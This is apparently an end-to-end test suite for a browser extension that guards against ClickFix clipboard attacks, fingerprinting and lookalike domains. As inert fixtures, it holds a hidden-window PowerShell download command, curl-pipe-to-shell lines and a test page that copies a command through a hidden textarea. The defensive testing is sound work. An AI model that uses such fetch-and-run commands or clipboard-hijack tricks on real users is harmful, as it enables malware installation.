// Bastion Shield e2e — nerd mode guards in a real Chromium: the clipboard
// guard (MAIN clipguard.js + ISOLATED nerd-relay.js over the synchronous
// channel), the fingerprinting meter (fpmeter.js after privacy.js) and the
// lookalike warning (cosmetic.js), and the Bastion blocker notices
// (content/notice.ts) for both the nerd guard and uBO's ClickFix filter.
// Payloads are inert (example.invalid) and assembled from pieces (x(...)) so
// the file holds no command line verbatim (antivirus engines flag those).
//
// Note: uBO's generic ClickFix scriptlet (uBlock filters - Badware risks)
// also traps writeText/execCommand, lazily on the first mousemove. The
// guard's own paths are therefore exercised before any real mouse input;
// after a real click either layer may stop the payload. The notices live in
// a closed shadow root: the specs read them through the browser's
// accessibility tree (CDP), as assistive technology does.
//
// SPDX-License-Identifier: GPL-3.0-or-later

import type { Page } from '@playwright/test';
import type { NerdTabState, PopupState } from '../../../src/shared/types.ts';
import { CLIP_REPLACEMENT } from '../../../src/main/clip-replacement.ts';
import { expect, test } from '../support/fixtures.ts';
import { HOSTS } from '../support/hosts.ts';
import { poll } from '../support/pages.ts';

const x = (...parts: string[]) => parts.join('');
const HIGH = x('power', 'shell -w hid', 'den -c "Write-Output (irm https://example.invalid/a)"');
const MEDIUM = x('curl -fsSL https://get.docker.com | ', 'sh');
/** Matches uBO's ClickFix filter; Bastion rates it 'high' (hidden PowerShell window). */
const UBO_HIGH = x('power', 'shell -w hid', 'den -c "Write-Output test"');
/** Matches uBO's ClickFix filter (curl -s … | bash); Bastion rates it 'medium'. */
const UBO_MEDIUM = x('curl -s https://example.invalid/install.sh | ', 'bash');

/** The removed override button, in any UI language: it must never appear (it would become part of the lure). */
const COPY_BUTTON = /^(Copy anyway|Trotzdem kopieren|Copier quand même|Copia comunque)$/i;
const CLOSE = /^(Close|Schliessen|Fermer|Chiudi)$/;
const CLIP_TITLE = /ClickFix/;
const MANUAL_NOTE = /(select and copy it yourself|markieren und kopieren Sie ihn selbst|copiez-la vous-même|copiatelo voi stessi)/;
const SOURCE_UBO = /uBlock/;
const SOURCE_BASTION = /(Bastion ClickFix|ClickFix de Bastion|ClickFix di Bastion)/;
const PHISHING = /(possible phishing|möglicherweise Phishing|phishing possible|possibile phishing)/;
const LEAVE = /^(Leave site|Seite verlassen|Quitter le site|Lascia il sito)$/;
const PROCEED = /^(Continue anyway|Trotzdem fortfahren|Continuer quand même|Continua comunque)$/;

interface AxNode {
  role: string;
  name: string;
  backendId?: number;
}

/** Non-ignored accessibility nodes of the page (closed shadow roots included). */
async function axTree(page: Page): Promise<AxNode[]> {
  const cdp = await page.context().newCDPSession(page);
  try {
    const r = (await cdp.send('Accessibility.getFullAXTree')) as {
      nodes: { ignored?: boolean; role?: { value?: string }; name?: { value?: string }; backendDOMNodeId?: number }[];
    };
    return r.nodes.filter((n) => !n.ignored).map((n) => ({ role: String(n.role?.value ?? ''), name: String(n.name?.value ?? ''), backendId: n.backendDOMNodeId }));
  } finally {
    await cdp.detach();
  }
}

/** Titles of the Bastion notices (role alert) currently shown. */
async function notices(page: Page): Promise<string[]> {
  return (await axTree(page)).filter((n) => n.role === 'alert').map((n) => n.name);
}

/** Click an accessibility node by role and name, with real mouse input at its centre. */
async function clickAx(page: Page, role: string, name: RegExp): Promise<void> {
  const node = (await axTree(page)).find((n) => n.role === role && name.test(n.name));
  if (!node?.backendId) throw new Error(`no ${role} ${name}`);
  const cdp = await page.context().newCDPSession(page);
  try {
    await cdp.send('DOM.getDocument', { depth: -1, pierce: true });
    const { model } = (await cdp.send('DOM.getBoxModel', { backendNodeId: node.backendId })) as { model: { content: number[] } };
    const q = model.content;
    await page.mouse.click((q[0] + q[4]) / 2, (q[1] + q[5]) / 2);
  } finally {
    await cdp.detach();
  }
}

const hasText = (nodes: AxNode[], re: RegExp) => nodes.some((n) => re.test(n.name));
const hasButton = (nodes: AxNode[], re: RegExp) => nodes.some((n) => n.role === 'button' && re.test(n.name));

/** Neither uBO's beige bar nor its message reached the page. */
const noUboBar = (page: Page) =>
  page.evaluate(() => !document.documentElement.outerHTML.includes('beige') && !(document.body?.innerText ?? '').includes('uBlock Origin blocked'));

const UBO_PAGE = '<!doctype html><meta charset="utf-8"><title>notice</title><p>Press the button to verify you are human.</p>';

test.describe('blocker notices (nerd mode off)', () => {
  test.beforeAll(async ({ ext }) => {
    await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: false } } }, 6000);
  });

  test("uBO's ClickFix filter shows the Bastion notice, never a copy button", async ({ page, server, ext }) => {
    const url = server.setPage(HOSTS.A, '/e2e/notice-ubo.html', UBO_PAGE);
    await ext.context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: new URL(url).origin });
    await page.goto(url);
    await page.bringToFront();
    await page.evaluate(() => navigator.clipboard.writeText('reset'));
    // uBO installs its traps on the first real mousemove.
    await page.mouse.move(40, 40);
    await page.mouse.move(80, 90);
    const write = (t: string) =>
      page.evaluate(async (s) => {
        await navigator.clipboard.writeText(s);
        return navigator.clipboard.readText();
      }, t);

    expect(await write(UBO_HIGH), 'uBO prevents the write').toBe('reset');
    await expect.poll(() => notices(page)).toHaveLength(1);
    let ax = await axTree(page);
    expect((await notices(page))[0]).toMatch(CLIP_TITLE);
    expect(hasText(ax, MANUAL_NOTE), 'the copy-it-yourself note').toBe(true);
    expect(hasButton(ax, COPY_BUTTON), 'no copy button').toBe(false);
    expect(hasText(ax, SOURCE_UBO), 'source line').toBe(true);
    expect(await noUboBar(page), "uBO's beige bar never appears").toBe(true);

    expect(await write(UBO_MEDIUM), 'uBO prevents the write').toBe('reset');
    await expect.poll(() => notices(page)).toHaveLength(2);
    ax = await axTree(page);
    expect(hasButton(ax, COPY_BUTTON), 'medium: no copy button either').toBe(false);

    // The same text again within 2 s: still two notices.
    await write(UBO_MEDIUM);
    await page.waitForTimeout(150);
    expect(await notices(page)).toHaveLength(2);

    // The × button closes a notice; Esc closes the focused one (keyboard only).
    await clickAx(page, 'button', CLOSE);
    await expect.poll(() => notices(page)).toHaveLength(1);
    await page.keyboard.press('Tab'); // the page has no focusable element: focus enters the notice
    await page.keyboard.press('Escape');
    await expect.poll(() => notices(page)).toHaveLength(0);
    expect(await noUboBar(page)).toBe(true);
  });

  test('a block inside a cross-origin iframe shows the notice in the top frame only', async ({ page, server }) => {
    const inner = server.setPage(HOSTS.B, '/e2e/notice-frame.html', '<!doctype html><meta charset="utf-8"><body style="height:300px">frame</body>');
    const url = server.setPage(HOSTS.A, '/e2e/notice-top.html', `<!doctype html><meta charset="utf-8"><title>top</title><iframe src="${inner}" style="width:600px;height:300px;border:0"></iframe>`);
    await page.goto(url);
    const frame = page.frames().find((f) => f.url() === inner);
    expect(frame, 'iframe loaded').toBeTruthy();
    // uBO's traps in the frame wait for a mousemove there.
    const box = (await page.locator('iframe').boundingBox())!;
    await page.mouse.move(box.x + 50, box.y + 50);
    await page.mouse.move(box.x + 90, box.y + 80);
    await frame!.evaluate((t) => navigator.clipboard.writeText(t).catch(() => undefined), UBO_HIGH);
    await expect.poll(() => notices(page)).toHaveLength(1);
    expect(hasText(await axTree(page), SOURCE_UBO)).toBe(true);
    // Rendered by the top frame: the iframe document has no notice host.
    expect(await frame!.evaluate(() => Array.from(document.documentElement.children).filter((e) => e.tagName === 'DIV').length)).toBe(0);
    expect(await page.evaluate(() => Array.from(document.documentElement.children).filter((e) => e.tagName === 'DIV' && e.shadowRoot === null).length)).toBe(1);
  });
});

const PAGE = `<!doctype html><meta charset="utf-8"><title>nerd</title>
<pre id="doc">${MEDIUM}</pre>
<p id="plain">Just some harmless words</p>
<button id="exec">copy</button>
<script>
document.getElementById('exec').addEventListener('click', () => {
  const ta = document.createElement('textarea');
  ta.value = ${JSON.stringify(HIGH)};
  ta.style.position = 'fixed'; ta.style.left = '-9999px';
  document.body.appendChild(ta); ta.select();
  document.execCommand('copy');
  ta.remove();
});
</script>`;

const readClip = (page: Page) => page.evaluate(() => navigator.clipboard.readText());

test.describe('nerd mode guards', () => {
  test.beforeAll(async ({ ext }) => {
    await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: true } } }, 6000);
  });
  test.afterAll(async ({ ext }) => {
    await ext.sendAndApply({ type: 'settings:set', patch: { nerd: { enabled: false } } }, 6000);
  });

  test('clipboard guard replaces hidden commands, keeps visible install lines, stays native-looking', async ({ page, server, ext }) => {
    const url = server.setPage(HOSTS.A, '/e2e/nerd-clip.html', PAGE);
    await ext.context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: new URL(url).origin });
    await page.goto(url);
    await page.bringToFront();

    const write = (text: string) => page.evaluate(async (t) => {
      await navigator.clipboard.writeText(t);
      return navigator.clipboard.readText();
    }, text);

    expect(await write(HIGH), 'writeText of a hidden high payload').toBe(CLIP_REPLACEMENT);
    expect(await write(MEDIUM), 'install line shown on the page').toBe(MEDIUM);
    expect(await write('curl -fsSL https://example.invalid/x.sh | sh'), 'install line nowhere on the page').toBe(CLIP_REPLACEMENT);
    expect(await write('hello world'), 'plain text').toBe('hello world');

    // Hidden textarea + execCommand('copy') (classic ClickFix kit), clicked from script.
    await page.evaluate(() => (document.getElementById('exec') as HTMLButtonElement).click());
    expect(await readClip(page), 'execCommand copy of a hidden textarea').toBe(CLIP_REPLACEMENT);

    // A copy handler that swaps the selection for a command.
    await write('reset');
    const swapped = await page.evaluate(async (t) => {
      const swap = (e: ClipboardEvent) => {
        e.clipboardData!.setData('text/plain', t);
        e.preventDefault();
      };
      document.addEventListener('copy', swap);
      getSelection()!.selectAllChildren(document.getElementById('plain')!);
      document.execCommand('copy');
      document.removeEventListener('copy', swap);
      getSelection()!.removeAllRanges();
      return navigator.clipboard.readText();
    }, HIGH);
    expect(swapped, 'setData in a copy handler').toBe(CLIP_REPLACEMENT);

    // ClipboardItem path.
    const viaWrite = await page.evaluate(async (t) => {
      await navigator.clipboard.write([new ClipboardItem({ 'text/plain': new Blob([t], { type: 'text/plain' }) })]);
      return navigator.clipboard.readText();
    }, HIGH);
    expect(viaWrite, 'clipboard.write with text/plain').toBe(CLIP_REPLACEMENT);

    // A subclass instance or an item from another realm is still a ClipboardItem to the native write.
    const viaSubclass = await page.evaluate(async (t) => {
      class Item extends ClipboardItem {}
      await navigator.clipboard.write([new Item({ 'text/plain': new Blob([t], { type: 'text/plain' }) })]);
      return navigator.clipboard.readText();
    }, HIGH);
    expect(viaSubclass, 'clipboard.write with a ClipboardItem subclass').toBe(CLIP_REPLACEMENT);
    const viaFrame = await page.evaluate(async (t) => {
      const f = document.createElement('iframe');
      document.body.append(f);
      const CI = (f.contentWindow as unknown as { ClipboardItem: typeof ClipboardItem }).ClipboardItem;
      await navigator.clipboard.write([new CI({ 'text/plain': new Blob([t], { type: 'text/plain' }) })]);
      f.remove();
      return navigator.clipboard.readText();
    }, HIGH);
    expect(viaFrame, "clipboard.write with an iframe's ClipboardItem").toBe(CLIP_REPLACEMENT);

    // The guard's blocks show the Bastion notice (identical text within 2 s
    // once, at most three cards), none with a copy button.
    await expect.poll(async () => (await notices(page)).length).toBeGreaterThanOrEqual(2);
    const ax = await axTree(page);
    expect((await notices(page)).length).toBeLessThanOrEqual(3);
    expect(hasText(ax, SOURCE_BASTION), 'source line: Bastion ClickFix protection').toBe(true);
    expect(hasText(ax, MANUAL_NOTE), 'copy-it-yourself note').toBe(true);
    expect(hasButton(ax, COPY_BUTTON), 'no copy button').toBe(false);

    // A real click (uBO's scriptlet may answer first): the payload never lands.
    await write('reset');
    await page.click('#exec');
    expect(await readClip(page), 'real click').not.toBe(HIGH);

    const looks = await page.evaluate(() => ({
      ts: Function.prototype.toString.call(Clipboard.prototype.writeText),
      name: Clipboard.prototype.writeText.name,
      exec: Function.prototype.toString.call(Document.prototype.execCommand),
      setData: Function.prototype.toString.call(DataTransfer.prototype.setData),
      tsts: Function.prototype.toString.call(Function.prototype.toString),
    }));
    expect.soft(looks.ts).toBe('function writeText() { [native code] }');
    expect.soft(looks.name).toBe('writeText');
    expect.soft(looks.exec).toBe('function execCommand() { [native code] }');
    expect.soft(looks.setData).toBe('function setData() { [native code] }');
    expect.soft(looks.tsts).toBe('function toString() { [native code] }');

    const tabId = await ext.tabIdOf(page);
    const nerd = await poll(
      async () => (await ext.send<PopupState>({ type: 'popup:state', tabId })).nerd as NerdTabState | null,
      (n) => (n?.clipboardBlocked ?? 0) >= 5,
      5000,
      200,
    );
    expect(nerd?.clipboardBlocked, 'blocked writes reported to the service worker').toBeGreaterThanOrEqual(5);
  });

  test('fingerprinting meter counts canvas, navigator and screen reads', async ({ page, server, ext }) => {
    const url = server.setPage(HOSTS.A, '/e2e/nerd-fp.html', '<!doctype html><meta charset="utf-8"><title>fp</title><canvas id="c" width="64" height="32"></canvas>');
    await page.goto(url);
    await page.evaluate(() => {
      const c = document.getElementById('c') as HTMLCanvasElement;
      const ctx = c.getContext('2d')!;
      ctx.fillText('fp', 2, 20);
      for (let i = 0; i < 3; i++) c.toDataURL();
      void navigator.hardwareConcurrency;
      void navigator.plugins;
      void screen.width;
      void screen.colorDepth;
      void window.devicePixelRatio;
    });
    const tabId = await ext.tabIdOf(page);
    const nerd = await poll(
      async () => (await ext.send<PopupState>({ type: 'popup:state', tabId })).nerd as NerdTabState | null,
      (n) => (n?.fp?.canvas ?? 0) >= 3 && (n?.fp?.screen ?? 0) >= 3,
      6000,
      250,
    );
    // Exactly the page's calls: privacy.js's own farbling reads are not counted.
    expect(nerd?.fp?.canvas, 'canvas reads').toBe(3);
    expect(nerd?.fp?.navigator, 'navigator reads').toBeGreaterThanOrEqual(2);
    expect(nerd?.fp?.screen, 'screen reads').toBeGreaterThanOrEqual(3);
    const name = await page.evaluate(() => HTMLCanvasElement.prototype.toDataURL.name + '|' + Function.prototype.toString.call(HTMLCanvasElement.prototype.toDataURL));
    expect.soft(name).toBe('toDataURL|function toDataURL() { [native code] }');
  });

  test('lookalike domain shows the Bastion notice and reaches the popup state', async ({ page, server, ext }) => {
    server.setPage('*', '/e2e/nerd-look.html', '<!doctype html><meta charset="utf-8"><title>look</title><p>hello</p>');
    await page.goto('https://www.paypa1.com/e2e/nerd-look.html');
    const tabId = await ext.tabIdOf(page);
    const nerd = await poll(
      async () => (await ext.send<PopupState>({ type: 'popup:state', tabId })).nerd as NerdTabState | null,
      (n) => n?.lookalike != null,
      5000,
      200,
    );
    expect(nerd?.lookalike).toEqual({ host: 'www.paypa1.com', target: 'paypal.com', reason: 'homoglyph' });
    // The notice is a host element with a closed shadow root appended to <html>.
    const bar = await poll(
      () => page.evaluate(() => Array.from(document.documentElement.children).filter((e) => e.tagName === 'DIV' && e.shadowRoot === null && getComputedStyle(e).position === 'fixed').length),
      (n) => n > 0,
      3000,
      100,
    );
    expect(bar, 'notice host').toBe(1);
    const box = await page.evaluate(() => {
      const host = Array.from(document.documentElement.children).find((e) => e.tagName === 'DIV' && e.shadowRoot === null) as HTMLElement;
      const r = host.getBoundingClientRect();
      return { top: r.top, right: innerWidth - r.right, width: r.width };
    });
    expect(box, 'top-right, 12px inset, 360px wide').toEqual({ top: 12, right: 12, width: 360 });
    await expect.poll(() => notices(page)).toHaveLength(1);
    expect((await notices(page))[0]).toMatch(PHISHING);
    const ax = await axTree(page);
    expect(hasText(ax, /paypal\.com/) && hasText(ax, /www\.paypa1\.com/), 'target and host').toBe(true);
    expect(hasButton(ax, LEAVE)).toBe(true);
    expect(hasButton(ax, PROCEED)).toBe(true);
    // «Continue anyway» only closes the notice.
    await clickAx(page, 'button', PROCEED);
    await expect.poll(() => notices(page)).toHaveLength(0);
    expect(page.url()).toBe('https://www.paypa1.com/e2e/nerd-look.html');
  });

  test('lookalike «Leave site» goes back', async ({ page, server }) => {
    const start = server.setPage(HOSTS.A, '/e2e/nerd-start.html', '<!doctype html><meta charset="utf-8"><title>start</title>');
    server.setPage('*', '/e2e/nerd-look2.html', '<!doctype html><meta charset="utf-8"><title>look</title><p>hello</p>');
    await page.goto(start);
    await page.goto('https://www.paypa1.com/e2e/nerd-look2.html');
    await expect.poll(() => notices(page)).toHaveLength(1);
    await clickAx(page, 'button', LEAVE);
    await page.waitForURL(start);
  });
});
